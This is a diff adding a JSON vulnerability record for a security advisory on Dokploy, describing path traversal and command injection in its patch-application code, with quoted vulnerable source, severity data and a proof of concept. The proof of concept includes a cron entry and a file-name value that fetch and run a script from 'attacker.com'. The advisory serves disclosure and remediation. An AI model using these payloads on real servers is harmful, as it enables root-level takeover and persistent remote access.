@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-phrr-h3mm-9vp6",
+  "aliases": [],
+  "title": "Path Traversal + Command Injection in Patch Application (`generateApplyPatchesCommand`)",
+  "summary": "### Summary\r\n\r\nThe `generateApplyPatchesCommand` function in Dokploy's patch system embeds the user-controlled `filePath` field from patch records directly into shell commands within double quotes, without path traversal prevention or shell escaping. This allows an authenticated user who can create patches to achieve arbitrary file write/delete outside the application code directory and Remote Code Execution via shell metacharacters in the `filePath`. Both attacks execute when the application is deployed.\r\n\r\n### Details\r\n\r\nThe patch `filePath` field is validated only as `z.string().min(1)` in the schema (`packages/server/src/db/schema/patch.ts:56-63`):\r\n\r\n```typescript\r\nconst createSchema = createInsertSchema(patch, {\r\n    filePath: z.string().min(1),   // No path traversal or shell character validation\r\n    content: z.string(),\r\n    type: z.enum([\"create\", \"update\", \"delete\"]).optional(),\r\n    enabled: z.boolean().optional(),\r\n    applicationId: z.string().optional(),\r\n    composeId: z.string().optional(),\r\n});\r\n```\r\n\r\nWhen patches are applied during deployment, `generateApplyPatchesCommand` (`packages/server/src/services/patch.ts:136-176`) builds shell commands by directly embedding the `filePath`:\r\n\r\n```typescript\r\nexport const generateApplyPatchesCommand = async ({ id, type, serverId }) => {\r\n    const codePath = join(basePath, entity.appName, \"code\");\r\n    // ...\r\n    for (const p of patches) {\r\n        const filePath = join(codePath, p.filePath);   // path.join resolves ../\r\n\r\n        if (p.type === \"delete\") {\r\n            command += `rm -f \"${filePath}\";`;          // Unescaped in double quotes\r\n        } else {\r\n            command += `\r\nfile=\"${filePath}\"                                      // Unescaped in double quotes\r\ndir=\"$(dirname \"$file\")\"\r\nmkdir -p \"$dir\"\r\necho \"${encodeBase64(p.content)}\" | base64 -d > \"$file\"\r\n`;\r\n        }\r\n    }\r\n    return command;\r\n};\r\n```\r\n\r\nThis generated command is executed in the application deployment flow (`packages/server/src/services/application.ts:217-232`):\r\n\r\n```typescript\r\ncommand += await generateApplyPatchesCommand({ id, type: \"application\", serverId });\r\n// ...\r\nconst commandWithLog = `(${command}) >> ${deployment.logPath} 2>&1`;\r\nif (serverId) {\r\n    await execAsyncRemote(serverId, commandWithLog);\r\n} else {\r\n    await execAsync(commandWithLog);\r\n}\r\n```\r\n\r\n**Attack Vector 1 - Path Traversal:** `path.join(codePath, filePath)` resolves `../` components. With `codePath = /var/lib/dokploy/applications/my-app/code` and `filePath = ../../../../etc/cron.d/backdoor`, the result is `/etc/cron.d/backdoor`. The patch `content` (base64-decoded) is written to this arbitrary path.\r\n\r\n**Attack Vector 2 - Command Injection:** The resolved path is embedded in double-quoted strings in the shell command. Shell metacharacters like `$(...)` or backticks inside double quotes are interpreted by bash. With `filePath = $(curl http://attacker.com/payload|bash).txt`, the subshell executes during deployment.\r\n\r\n### PoC\r\n\r\n**Prerequisite:** Authenticated user with service create permission on any application or compose service.\r\n\r\n**Step 1: Create a malicious patch (path traversal - arbitrary file write):**\r\n\r\n```http\r\nPOST /api/trpc/patch.create\r\nContent-Type: application/json\r\nAuthorization: Bearer <session-token>\r\n\r\n{\r\n    \"filePath\": \"../../../../etc/cron.d/dokploy-rce\",\r\n    \"content\": \"* * * * * root curl http://attacker.com/shell.sh | bash\\n\",\r\n    \"type\": \"create\",\r\n    \"applicationId\": \"<target-application-id>\"\r\n}\r\n```\r\n\r\n**Step 2: Deploy the application to trigger patch application:**\r\n\r\n```http\r\nPOST /api/trpc/application.deploy\r\nContent-Type: application/json\r\nAuthorization: Bearer <session-token>\r\n\r\n{\r\n    \"applicationId\": \"<target-application-id>\"\r\n}\r\n```\r\n\r\nDuring deployment, the patch is applied. `/etc/cron.d/dokploy-rce` is created on the server with the attacker's crontab entry, establishing a persistent reverse shell that runs every minute as root.\r\n\r\n**Alternative: Command inj...",
+  "published_at": "2026-11-12T08:16:44.000Z",
+  "modified_at": "2026-11-12T08:16:44.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.9,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-22",
+    "CWE-78"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-phrr-h3mm-9vp6",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-phrr-h3mm-9vp6",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-phrr-h3mm-9vp6",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:1070f40e026def1b060677616a46bba3ef4fe6f1264f7bc538631bab2f64ce97",
+  "note": null
+}
